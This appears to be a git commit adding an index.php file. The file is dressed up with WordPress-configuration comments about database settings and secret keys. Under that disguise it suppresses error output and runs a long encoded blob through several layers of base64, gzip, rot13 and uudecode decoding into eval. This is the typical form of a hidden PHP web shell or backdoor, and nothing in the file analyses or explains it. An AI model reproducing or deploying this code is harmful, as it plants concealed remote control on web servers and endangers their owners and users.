19ea47c1fd1dceba5b1bea74733e08b60291e05c
AKAZH ID <36891477+justakazh@users.noreply.github.com>
2020-01-28 12:48:20 -0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,32 @@
+﻿<?php 
+//
+/** Enable W3 Total Cache */
+// Added by W3 Total Cache
+
+/**
+ * The base configuration for website
+ *
+ * The index.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "index.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * 
+ *
+ * 
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+@ini_set(‘output_buffering’,0); 
+@ini_set(‘display_errors’, 0);
+
+$convert = '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';
+@eval(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($convert)))))));
+?>
